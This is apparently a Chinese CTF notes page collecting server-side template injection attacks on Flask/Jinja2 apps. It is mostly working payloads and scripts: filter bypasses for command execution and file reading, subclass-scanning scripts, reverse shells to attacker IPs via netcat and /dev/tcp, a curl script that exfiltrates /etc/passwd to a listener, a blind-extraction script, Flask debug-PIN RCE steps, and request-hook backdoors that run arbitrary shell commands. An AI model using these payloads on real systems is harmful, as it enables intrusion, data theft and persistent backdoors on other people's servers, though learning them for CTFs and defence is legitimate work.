---
title: "ssti模板注入"
date: 2026-03-20 09:52:18
categories: "WEB"
tags:
  - "WEB"
cover: /img/backgrounds/bg-14.png
top_img: /img/backgrounds/bg-14.png
disableNunjucks: true
---

### fengjin用法
```plain
python -m fenjing webui
```

### 通用payload
```plain
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

```plain
user_input={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')()}}
```



# 基本绕过
### {{}}过滤
#尝试{% %}

```plain
 {% if 2>1 %}yu10{% endif %} {% if ''.__class__ %}0{% endif %} 
```

有回显yu10说明''.__class__有内容

```plain
{% if "".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("cat /etc/passwd").read() %}yu10{% endif %} 
```

如果有回显yu10则说明命令正常执行

<font style="color:rgb(77, 77, 77);">payload:</font>

```plain
{% print("".__class__.__base__.__subclasses()['+str(i)+'].__init__.__globals__["popen"]("cat /f*").read()) %}
```

### <font style="color:rgb(79, 79, 79);">过滤[] </font>
<font style="color:rgb(79, 79, 79);">使用getitem</font>

__getitem__()是python的一个魔术方法

对字典使用时，传入字符串，返回字典相应键所对应的值；

对列表使用时，传入整数，返回列表对应索引的值；

简单来说，就是用.__getitem__('117') 代替 ['117']  ['popen']

```plain
{{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /etc/passed').read()}}
```

### <font style="color:rgb(79, 79, 79);">过滤引号</font>
使用request



# <font style="color:rgb(79, 79, 79);">无回显SSTI</font>
### 反弹shell
```plain
import requests
 
url = input("请输入目标URL地址")
 
for i in range(300):
    try:
        data = {"code":'{{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("netcat 监听主机 端口 -e /bin/bash").read()}}'}
        response = requests.post(url,data=data)
    except:
        pass
#监听主机收到反弹shell进入对方命令行界面
```

本机：

```plain
netcat -lvvp 监听端口号
```

对方：

```plain
netcat 192.xxx.xxx.1 2333 -e /bin/bash 
# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
#-e后面跟的参数代表的是在创建连接后执行的程序
```

bash：

```plain
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
或
bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"
# bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1
```

<font style="color:rgb(77, 77, 77);">Bash反弹一句完整的解读过程就是：</font>

<font style="color:rgb(77, 77, 77);">Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</font>

### <font style="color:rgb(79, 79, 79);">带外注入</font>
使用wget方法来带外想要知道的内容

也可以使用dnslog或者nc

```plain
import requests
 
url = input("请输入目标URL地址")
 
for i in range(300):
    try:
        data = {"code":'{{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("curl http://监听主机ip/`cat /etc/passwd`").read()}}'}            
        #反引号命令执行
        response = requests.post(url,data=data)
    except:
        pass
#同时kali开启一个python http监听  #python3 -m http.server 80
#cat没办法换行，只能显示第一行（需要配合换行命令来显示其他内容）
```

<font style="color:rgb(77, 77, 77);">将反引号的内容 作为前面url的命令执行，并且把内容外带出来</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/ssti模板注入/img-001.png)

### 盲注
二分法：

```plain
#!/usr/bin/env python3
# coding=utf-8
 
import requests
 
#注意: 这里只适用于 > 的情况
flag = ""
start = 1  # 第几个字符
while True:
    low = 32 
    high = 126
    mid = (low + high) // 2  # 整数除法
    while low < high:
        url = "http://0b7c2aed-1a0a-4c5c-9829-2e1721548848.challenge.ctf.show/?name="
        payload =f"{{% set a=(lipsum.__globals__.__builtins__.open('/flag').read({start})) %}}{{% if a>'{flag + chr(mid)}'%}}yu10{{% endif %}}"
 
        url_payload = url + payload
 
        # 页面返回正常的特征值
        identify_str = "yu10"
 
        # 请求
        response = requests.get(url=url_payload)
        # print(payload)
        if identify_str in response.text:  # 页面返回正常
            low = mid + 1
        else:  # 页面返回异常
            high = mid
        mid = (low + high) // 2 
        if mid <= 32 or mid >= 126:
            break
    if chr(mid) == ' ':
        break
    flag += chr(mid)
    print(flag)
    start += 1
```



# 脚本
文件读取_frozen_importlib_external.FileLoader

```plain
import requests
url = input('请输入URL链接: ')
for i in range(500):
    data = {"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
    #data = {"name":"{{().__class__.__mro__[1].__subclasses__()["+str(i)+"]}}"}
    try:
        response = requests.post(url,data=data)
        #print(response.text)
        if response.status_code == 200:
            if '_frozen_importlib_external.FileLoader' in response.text:
                print(i)
    except:
        pass
'''
#FileLoader的利用
{{''.__class__.__mro__[1].__subclasses__()[79]["get_data"](0,"/etc/passed")}}
#读取配置文件下的FLAG
{{config}}
{{url_for.__globals__['current_app'].config.FLAG}}
{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
'''
```

### evalRCE
```plain
import requests
url = input('请输入URL链接: ')
for i in range(500):
    data={"name":
    "{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"}
    try:
        response = requests.post(url,data=data)
        #print(response.text)
        if response.status_code == 200:
            if 'eval' in response.text:
                print(i)
    except:
        pass
 
#payload:
'''
{{''.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat ./etc/passwd").read()')}}
__builtins__提供对python的所有”内置“标识符的直接访问
eval()计算字符串表达式的值
__import__加载os模块
popen()执行一个shell以运行命令来开启一个进程，执行cat /etc/passwd
(system没有回显)
'''
```

### os模块执行命令
```plain
import requests
url = input('请输入URL链接: ')
for i in range(500):
    data={"name":
    "{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"}
    try:
        response = requests.post(url,data=data)
        #print(response.text)
        if response.status_code == 200:
            if 'os.py' in response.text:
                print(i)
    except:
        pass
 
#payload:
'''
#通过config，调用os
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
#通过url_for，调用os
{{url_for.__globals__.os.popen('whoami').read()}}
#在已经加载好os模块的子类里直接调用os模块
{{''.__class__.__bases__.__subclasses__()[123].__init__.__globals__['os'].popen("ls -l /opt").read()}}
'''
```

### importlibRCE
```plain
import requests
url = input('请输入URL链接:')
for i in range(500):
    data = {"name":
    "{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"}
    try:
        response = requests.post(url,data=data)
        if response.status_code == 200:
            if '_frozen_importlib.BuiltinImporter' in response.text:
                print(i)
    except:
        pass
 
'''
可以加载第三方库，使用load_module引入os
python脚本查找_frozen_importlib.BuiltinImporter
#payload:
{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls -l /opt").read()}}
'''
```

### linecache
```plain
import requests
url = input('请输入URL链接:')
for i in range(500):
    data = {"name":
    "{{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"}
    try:
        response = requests.post(url,data=data)
        if response.status_code == 200:
            if 'linecache' in response.text:
                print(i)
    except:
        pass
 
#payload:
'''
{{[].__class__.__base__.__subclasses__()[191].__init__.__globals__['linecache']['os'].popen("ls -l /").read()}}
{{[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen("ls -l /").read()}}
#linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用linecache函数如执行命令。
#python脚本查找linecache
'''
```

### subprocess.popen
```plain
import requests
url = input('请输入URL链接:')
for i in range(500):
    data = {"name":
    "{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"}
    try:
        response = requests.post(url,data=data)
        if response.status_code == 200:
            if 'subprocess.Popen' in response.text:
                print(i)
    except:
        pass
 
'''
从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。
subprocess意在替代其他几个老的模块或者函数，比如：os.system,os.popen等函数。
python脚本查找subprocess.Popen:
'''
#payload:
'''
{{[].__class__.__base__.__subclasses__()[200]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
这里将参数传递给 shell=True 会让命令在 shell 环境下运行，这可以使用户更容易地传递一些组合命令。
communicate() 方法发起与执行命令的子进程的双向通信，并等待命令完成。我们调用此方法以获取命令输出和错误结果。
communicate()[0] 返回命令输出，因为在这个例子中无需关心可能存在的错误结果。
strip() 去除输出的最前面之后的空白字符。
'''
```

# 常见payload
执行命令

```plain
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```



<font style="color:rgb(51, 51, 51);">文件读取</font>

```plain
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```







## Flask PIN码生成终端RCE
**<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">[GYCTF2020]FlaskApp</font>**

**<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">得到PIN码需要六个信息：</font>**

```plain
1、flask所登录的用户名
2、modname，一般是flask.app
3、getattr(app, “name”, app.class.name)。一般为Flask
4、flask库下app.py的绝对路径。这个可以由报错信息看出
5、当前网络的mac地址的十进制数。
6、机器的id。
```

**<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">flask用户名可以通过读取/etc/passwd来知道</font>**

**<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">#open('/etc/passwd/')</font>**

```plain
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}{% endif %}{% endfor %}
```

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">app.py路径从报错找</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">mac地址的十进制数读取 /sys/class/net/eth0/address  将：去掉转为十进制</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">docker机器的id  非docker机： /etc/machine-id  /proc/sys/kernel/random/boot_i</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">docker机：/proc/self/cgroup</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">使用脚本md5或sha1</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">最后/console 进行rce</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/ssti模板注入/img-002.png)



## <font style="color:rgb(34, 34, 38);">Flask的渲染方法函数</font>
### <font style="color:rgb(34, 34, 38);">render_template()</font>


### <font style="color:rgb(34, 34, 38);">render_template_string</font>
### before挂马：
```plain
{{config.__init__.__globals__['__builtins__']['eval']("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('ls /').read())")}}
```

config.__init__可用url_for代替

执行了之后访问所有页面都会是匿名函数返回的结果,可能会被搭便车,也很容易被发现.

### after_request()方法挂马：
```plain
{{config.__init__.__globals__['__builtins__']['eval']("__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: r if __import__('flask').request.args.get('1') and exec('global r;r=__import__(\\'sys\\').modules[\\'__main__\\'].__dict__[\\'app\\'].make_response(__import__(\\'os\\').popen(__import__(\\'flask\\').request.args.get(\\'1\\')).read())')==None else resp)")}}
```

